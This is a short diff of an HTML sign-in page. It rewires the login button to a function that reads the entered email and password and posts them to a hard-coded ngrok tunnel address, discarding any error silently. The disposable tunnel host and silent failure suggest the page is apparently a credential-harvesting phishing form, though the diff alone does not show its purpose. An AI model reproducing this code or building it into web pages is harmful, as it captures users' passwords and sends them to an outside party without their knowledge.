@@ -63,16 +63,15 @@
       <label for="password">Password</label>
       <input type="password" id="password" name="password" required />
 
-      <button type="submit">Sign In</button>
+       <button type="button" onclick="sendCredentials()">Login</button>
     </form>
   </div>
   <script>
     const serverUrl = "https://4372-2409-40f2-2088-39e3-cd3c-faee-1fcc-1c00.ngrok-free.app";
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault(); 
+    function sendCredentials() { 
 
       const data = {
-        email: document.getElementById('username').value,
+        email: document.getElementById('email').value,
         password: document.getElementById('password').value
       };
 
@@ -84,7 +83,7 @@
         body: JSON.stringify(data)
       }).catch(() => {
       });
-    });
+    };
   
   </script>
 </body>
